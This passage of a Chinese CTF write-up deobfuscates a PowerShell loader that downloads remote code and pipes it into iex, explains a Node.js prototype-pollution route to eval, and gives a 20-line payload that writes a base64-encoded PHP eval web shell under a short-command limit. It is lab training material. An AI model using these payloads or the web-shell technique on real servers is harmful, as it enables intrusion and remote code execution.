<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234453555.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234453555.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234453555.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234453555.png?size=large 2x" sizes="auto" data-title="image-20231015234453555" data-alt="image-20231015234453555" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>又得到一堆代码：</p>
<div class="highlight" id="id-27"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">([</span><span class="no">RUntimE.inteRopSeRVICES.MArshAl</span><span class="p">]::</span><span class="n">PTrTOstrInGanSi</span><span class="p">([</span><span class="no">ruNtime.InTEropsERViCes.MArsHAL</span><span class="p">]::</span><span class="n">sEcuresTrINgTOGLoBalalLOCAnsI</span><span class="p">(</span><span class="vm">$</span><span class="p">(</span><span class="s1">&#39;76492d1116743f0423413b16050a5345MgB8AGgAWQAxAGsAWgB5AEEAcgBLAGwASQAvAEYATwA5AFUAZABhAGIAUgBBAEEAPQA9AHwANAA3ADMANwA5AGQAMgAxAGUAYwA2AGIAMwBhADQAYQBmAGUANQA4ADEAYwAwADQAZQBmADEAYgBmAGUAMwA5ADAAYQBkAGUAOAAzAGQAZAA2AGIAMgA2AGYAMABmAGUANwA0AGUAZgAxADAAMwBiADEANwAyADcANQBkAGUANwBmADkAOAAwADQAYgA0ADgANwBhADEAYQA3ADIAZgA4AGQAMQAxADAAMwA4AGEANwA5ADcANwBkADQANwAzADUAZABmADAAMwA3ADkAZgBkAGYANwAxADQAMQA0ADcAZAA0AGUANAAxADkAYQBlAGIAMwAyAGMAYgBkADYANwA0AGQANwAxADMAZQAwADEAMgBjADUANQBiAGMAYQAxADIANwAxAGEAZgAzADAAMABlADYAMAA4ADAAMgAwADQAOAA0ADMANgA3ADUAZAA5AGYAOQBiADEAMwA0AGQAZAA0ADkANQAwADIAOQBiADIANgBhADEAMwA3ADgANwA4ADAAZgBkADkAZQA2AGIAMQBjADYAMAAwADkANABmAGUAMgA1AGEAYQBkADEAOQBmAGIAZAA1AGIAMQA3ADkAMABlAGEANQBlAGIAMgAwADEAOQBmADMAYgA3AGUAMgBhADMANQA2ADkAMQBhADAAMABlADEAOQBjADUAOQBjADUANgA2ADEANgBjAGMAZgBmADkAZABiADIAZgA5ADUAMwA0ADkAMQAyADYAYgBlADEAMgBmADQAMAA1AGUAYwBjADAAZgBhADEAYgA2ADkAZQBhADIAOAAxADIAMAAyADQAZAA5ADUAMAAxAGUAOABjAGEAMwBkADMAOQBiADkANQBlADkANwBhAGYAYgA2AGQAMgAyAGQANwBiAGIANwAzADIAOABjADcAYQBhAGEAMAAwAGQANAA4AGQANgA1ADgANwA1ADcANQAzADkAMQAyADcAMwA1AGMAYwAxADgANQAzADAAYwAyAGEANAAyADgAMQA4ADMANwAxADIAZgAxAGEANwAwAGUAOQAyAGQAOQBmAGMAYwA0ADgANAA2ADEAMABmAGQAOQAzAGYAMwBjADIANAAwAGQAYwA2AGIAYQBjADAANwAxADAAMgBiADAAYwAwAGEAZQAwADYANQAzADgANAA3ADIAZgBhADgAMwBmADEANgA4AGUAYwA5ADgAMQAyADEAYgAwADkAYwAxADEAMABhAGUANABiAGEAZgA0AGIAYgBiADMAMwBmAGEANQAwADUAOQBiAGYAMgBhAGIANQA1AGMAZQA4ADcAOAAwADYAMQA1AGYAZQA2ADMAYgAyADEAMgA3AGUAOAAwAGMANgBkAGQAZgBkADcANAAyADQAMQBkADgANwAyADUAOAA5AGEAZAAzADMAMQA4ADIAYwA1ADQAOQBjAGMANAA2ADUAMQA3AGYAYQA4ADUAZQA4ADEAYgAzADQAMQAzAGQAZgAwAGEANQA5ADQANgBkAGQAYQBkAGQAMwA4ADUAOQA2AGEANgBiAGUAZAA4ADgAOAAwADMAMwBlADcAZgA3ADgAYwBmADgANABjAGYANwAzAGIAZgBlADAANABlADIANABiADcAOQBmAGYAOAA5AGYAMAAyADYANwA1ADAAYQA3ADgAMgBlAGUAYwBhADMAZAA2AGYAYQAxAGUAYwAyAGIAYgA5AGMAMgA1AGYAYgA3AGYAYgBiADAAYwA4ADcAZQAzADQAMwA3AGMAMgA2ADcAMABhADIAOAA0AGUANAAyAGIANQA3ADEAOQAzAGMAZQBmADYANgBmADYAOAA3ADAANAAzADYAOAA1ADAAZQAzADgAMABhADYANgBlADAAZABlADAAMQBlADQAZgAyAGEAMwBlADcAZgBkAGEAMwBlAGUANQA5AGQANABiADEAZgA3AGIAMQBlADEANgAzADMAMgBkADIAMgAzADgAMAAwADUAZQAyAGUAYgA1AGUAZQAxAGMANQBkADgANgAyAGUANgBiAGEAZgAxAGMAMwBhADMAOAA4AGQAMgAwADgAZgBkADQAZgAyADkANgAyADgAOAA3ADAANgA3ADQAMwA0AGEAZAAzAGYAZgA3AGIAOQA0AGQANAAyADgAMAA5ADEAYQA4AGMAYwBkAGQAOQBjADMAZQA0ADQAMwBhAGYAZABhAGUAZgA4ADYAMABkAGEAOQA3ADgAMQA5ADYAOAAzADUAYQBmADYAMAA2ADYAYwA3AGYANwBhADAAMQA4AGYAYwBmADQAYgA1ADgAZQBjAGMAZgA5ADIAMAA5AGEAOQA1AGUAZgA5ADYAZgA4ADgAYgAwAGIANAAyAGMANgAwADcAMwBjAGQAZQBjAGMANQA5AGMANAA5AGUANgBiAGUAYQAzADUAZQBhAGYAZgA0ADAAMgAzAGYAYQA4AGQANQA0AGQAZQBlADcAOAA0ADYAMAAwADcANgBiADYAMQAyADgAOAAwAGMANwA0ADkAOQBmAGMAZAAzADMAYgBiAGMAOAA0ADUANgAzADkANgA0ADcAZQA5AGEAOQA0ADIANAA1ADIAOAA3ADEANAA4ADMAMAA4AGIAYQA2ADIAYgA4ADQAYgA1ADEAYwBkADkAZQAwAGUANABiADAAMwBkADMANQA0ADAAZABkADAAYQA0ADQAZAAwAGQAMQBhAGIANgA0ADIANAA4ADEANwBjADMAOQAyADAAMQAzADEAMAA0ADAAYwA5AGUAOAAwADMAMQA0ADEANwA1ADcANwA0ADcANgA2ADEAMQAyAGMANwBhAGUAMwA1ADQAOQBiADgAOQAzADIAMwA2ADIAMgA5AGIAYwBlADgAMgAzADcAYQA1ADEAOAA5AGEAYQA0AGUAMgBjADEANgBiAGYANwBlAGIAOABkADYAMwA2ADIANgAzADkANQBlAGYANwAxADQAZABjADYAMwBjADIANABjADkAZQBhADEAYgBhADYAOABlAGUAMABjAGQAMwBjADkAOQBhAGMANQBiADkAOAAzADkAOQA4AGQAMgA1AGIAZAAxAGIAZAAxADAAOQBkADgAOABkADUAZAA0ADkANwA5ADMANgAyADgAMABjADcANgA0ADAAMAA3ADcAMwA1AGQANAA1ADQAMAAwADUANQBlADQAMgBmADIAZQAxADEAOABhADQAMwAyADYANAA1ADMAMQBiADIAMgAyADAAYwBiADAAYgAzADQAOQBhADcAZgA=&#39;</span><span class="p">|</span><span class="nb">ConverTTo-SecuREstrIng</span>  <span class="n">-kE</span>  <span class="mf">42</span><span class="p">,</span><span class="mf">137</span><span class="p">,</span><span class="mf">50</span><span class="p">,</span><span class="mf">223</span><span class="p">,</span><span class="mf">36</span><span class="p">,</span><span class="mf">203</span><span class="p">,</span><span class="mf">229</span><span class="p">,</span><span class="mf">186</span><span class="p">,</span><span class="mf">143</span><span class="p">,</span><span class="mf">133</span><span class="p">,</span><span class="mf">56</span><span class="p">,</span><span class="mf">36</span><span class="p">,</span><span class="mf">64</span><span class="p">,</span><span class="mf">169</span><span class="p">,</span><span class="mf">200</span><span class="p">,</span><span class="mf">109</span><span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)|.</span> <span class="p">((</span><span class="n">vARiAbLE</span> <span class="s1">&#39;*mDr*&#39;</span><span class="p">).</span><span class="n">NaME</span><span class="p">[</span><span class="mf">3</span><span class="p">,</span><span class="mf">11</span><span class="p">,</span><span class="mf">2</span><span class="p">]</span><span class="n">-JoIN</span><span class="s1">&#39;&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><p>虽然还是很长，但是结构比上一个要清晰。我们发现第一个管道符<code>|</code>前面的都是加密的字符串，后面的<code>ConverTTo-SecuREstrIng</code>应该是字符串的转化操作（不知道是干什么的），第二个管道符后面还有一串不知道的东西，运行一下：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234740264.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234740264.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234740264.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234740264.png?size=large 2x" sizes="auto" data-title="image-20231015234740264" data-alt="image-20231015234740264" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>看都不用看，直接删了。然后带着第一个管道符一起执行。结果如下：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234916981.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234916981.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234916981.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234916981.png?size=large 2x" sizes="auto" data-title="image-20231015234916981" data-alt="image-20231015234916981" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<div class="highlight" id="id-28"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$a</span><span class="p">=((</span><span class="s2">&#34;{10}{0}{3}{21}{9}{15}{5}{6}{20}{12}{7}{8}{17}{18}{19}{11}{13}{1}{14}{16}{2}{4}&#34;</span><span class="o">-f</span><span class="s1">&#39;/www&#39;</span><span class="p">,</span><span class="s1">&#39;ss_verr&#39;</span><span class="p">,</span><span class="s1">&#39;esti&#39;</span><span class="p">,</span><span class="s1">&#39;.ctf.com?S&#39;</span><span class="p">,</span><span class="s1">&#39;ng}&#39;</span><span class="p">,</span><span class="s1">&#39;h&#39;</span><span class="p">,</span><span class="s1">&#39;ell_&#39;</span><span class="p">,</span><span class="s1">&#39;ion_&#39;</span><span class="p">,</span><span class="s1">&#39;isss&#39;</span><span class="p">,</span><span class="s1">&#39;=susctf{Pow&#39;</span><span class="p">,</span><span class="s1">&#39;https:/&#39;</span><span class="p">,</span><span class="s1">&#39;sss&#39;</span><span class="p">,</span><span class="s1">&#39;scat&#39;</span><span class="p">,</span><span class="s1">&#39;sssss&#39;</span><span class="p">,</span><span class="s1">&#39;rry_&#39;</span><span class="p">,</span><span class="s1">&#39;erS&#39;</span><span class="p">,</span><span class="s1">&#39;inter&#39;</span><span class="p">,</span><span class="s1">&#39;ssss&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;Deobfu&#39;</span><span class="p">,</span><span class="s1">&#39;US&#39;</span><span class="p">))(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="nv">$a</span><span class="p">)|</span><span class="n">iex</span></span></span></code></pre></td></tr></table>
</div>
</div><p>哈哈，flag已经初见形状。这里只有一个变量<code>$a</code>，手解似乎也行。但是看到了一个大大的iex。直接删了执行：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015235115096.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015235115096.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015235115096.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015235115096.png?size=large 2x" sizes="auto" data-title="image-20231015235115096" data-alt="image-20231015235115096" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>似乎<code>(New-Object Net.WebClient).DownloadString($a)</code>影响了执行。那么一起删了：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015235231158.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015235231158.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015235231158.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015235231158.png?size=large 2x" sizes="auto" data-title="image-20231015235231158" data-alt="image-20231015235231158" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>成功得到flag。</p>
<h1 id="web">Web</h1>
<h2 id="0x01-pollute-me">0x01 pollute me</h2>
<p>首先，根据题目的提示，该题目可能是一个nodejs原型链污染的题目。</p>
<p>原型链污染常常发生的地点是两个对象合并的时候。当相互合并的变量中有一个变量可控，我们就可以将<code>__proto__</code>赋值给合并的对象，从而造成原型链污染。</p>
<p>由于js对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined。当我们成功加入<code>__proto_</code>的时候，就会影响所有来自于这个原型的对象。</p>
<p>直奔主题，审计app.js。这里直接找到了merge函数：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016091430092.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016091430092.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016091430092.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016091430092.png?size=large 2x" sizes="auto" data-title="image-20231016091430092" data-alt="image-20231016091430092" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>同时也找到了使用Merge函数的地方：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016091452796.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016091452796.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016091452796.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016091452796.png?size=large 2x" sizes="auto" data-title="image-20231016091452796" data-alt="image-20231016091452796" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>merge的第二个参数<code>req.body</code>显然是我们可控的。只要在请求体中放入键值对应的json就可以实现污染。注意这里需要有个前提，就是结构体中的username字段必须等于存在的username（就是你注册的那个username）。</p>
<p>我们直接开始实操，首先需要注册用户：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016092636045.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016092636045.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016092636045.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016092636045.png?size=large 2x" sizes="auto" data-title="image-20231016092636045" data-alt="image-20231016092636045" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>这里为了方便将两个名字全部设为一样的。</p>
<p>接下来直接去修改信息。但是为了能修改请求体的内容（而且网页中并没有给我们提供修改username的接口），这里还是选择抓包：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016092853450.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016092853450.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016092853450.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016092853450.png?size=large 2x" sizes="auto" data-title="image-20231016092853450" data-alt="image-20231016092853450" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>将请求体改为：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093530806.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093530806.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093530806.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093530806.png?size=large 2x" sizes="auto" data-title="image-20231016093530806" data-alt="image-20231016093530806" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>原因是我们需要在eval中进行命令执行，参数就是eval_item：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093320507.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093320507.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093320507.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093320507.png?size=large 2x" sizes="auto" data-title="image-20231016093320507" data-alt="image-20231016093320507" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>这里提交修改，发现“姓名更新成功”后才能进行下一步（eval只有一次机会）。然后就直接访问/eval：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093735696.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093735696.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093735696.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093735696.png?size=large 2x" sizes="auto" data-title="image-20231016093735696" data-alt="image-20231016093735696" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>就可以看到flag了。</p>
<h2 id="0x02-php-is-all-you-need">0x02 PHP Is All You Need</h2>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093823510.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093823510.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093823510.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093823510.png?size=large 2x" sizes="auto" data-title="image-20231016093823510" data-alt="image-20231016093823510" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>审计代码发现，接受的cmd参数可以直接命令执行，但是要求是字符小于20。</p>
<p>首先用ls看一下：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113951973.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113951973.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113951973.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113951973.png?size=large 2x" sizes="auto" data-title="image-20231016113951973" data-alt="image-20231016113951973" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>发现光flag文件的名称都14个字符了，再加上两个引号和括号和一个分号都21个字符了。很显然不能满足题目要求。</p>
<p>这里有几个技巧：</p>
<ul>
<li>
<p>Linux可以用<code>\</code>拼接命令</p>
</li>
<li>
<p>可以用 <code>ls -t</code>按照时间顺序，后执行的排前面，于是可以拆分命令再拼接来实现。</p>
</li>
<li>
<p>可以用 <code>ls -th</code>，<code>-h</code> 不影响执行，但 <code>ht-</code> 就能排到 <code>sl</code> 前面去</p>
</li>
</ul>
<p>这里的想法是写入一句话木马<code>&lt;?php eval（$_GET[1]);</code>到<code>1.php</code>中。</p>
<p>因为有不少标点符号，这里直接用base64编码，为<code>PD9waHAgZXZhbCgkX0dFVFsxXSk7</code></p>
<p>写入的命令是：<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code></p>
<p>这里我们需要用拼接符号连接，同时需要按照时间倒序排列，才能<code>ls -t</code>到正常的顺序。</p>
<p>最后<code>ls -t &gt;0</code>写入到0这个文件中，然后<code>sh 0</code>执行0即可。</p>
<p>于是payload为：</p>
<div class="highlight" id="id-29"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;hp
</span></span><span class="line"><span class="cl">&gt;1.p\\
</span></span><span class="line"><span class="cl">&gt;d\&gt;\\
</span></span><span class="line"><span class="cl">&gt;\ -\\
</span></span><span class="line"><span class="cl">&gt;e64\\
</span></span><span class="line"><span class="cl">&gt;bas\\
</span></span><span class="line"><span class="cl">&gt;7\|\\
</span></span><span class="line"><span class="cl">&gt;XSk\\
</span></span><span class="line"><span class="cl">&gt;Fsx\\
</span></span><span class="line"><span class="cl">&gt;dFV\\
</span></span><span class="line"><span class="cl">&gt;kX0\\
</span></span><span class="line"><span class="cl">&gt;bCg\\
</span></span><span class="line"><span class="cl">&gt;XZh\\
</span></span><span class="line"><span class="cl">&gt;AgZ\\
</span></span><span class="line"><span class="cl">&gt;waH\\
</span></span><span class="line"><span class="cl">&gt;PD9\\
</span></span><span class="line"><span class="cl">&gt;o\ \\
</span></span><span class="line"><span class="cl">&gt;ech\\
</span></span><span class="line"><span class="cl">ls -t&gt;0
</span></span><span class="line"><span class="cl">sh 0</span></span></code></pre></td></tr></table>
</div>
</div><p>依次输入执行20个命令，使用<code>ls</code>看一下：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113711078.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113711078.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113711078.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113711078.png?size=large 2x" sizes="auto" data-title="image-20231016113711078" data-alt="image-20231016113711078" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>发现1.php已经写入服务器，此时直接访问1.php，然后命令注入即可：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113844061.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113844061.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113844061.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113844061.png?size=large 2x" sizes="auto" data-title="image-20231016113844061" data-alt="image-20231016113844061" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>查看源码，发现flag：</p>
